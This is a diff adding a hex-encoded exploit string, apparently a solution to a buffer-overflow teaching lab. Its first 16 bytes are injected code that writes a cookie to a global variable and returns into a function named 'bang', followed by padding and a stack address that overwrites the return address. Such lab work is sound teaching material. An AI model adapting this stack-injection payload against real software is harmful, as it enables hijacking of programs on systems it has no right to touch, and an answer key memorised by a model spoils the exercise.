@@ -1,0 +1,5 @@
+b8 d0 79 2e 7f a3 0c d1 04 08 
+68 52 8d 04 08 c3 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 08 31 68 55 /* last 4 bytes : the address of exploit code in stack, first 16 bytes : exploit code to write cookie to global_value and ret to bang */ 
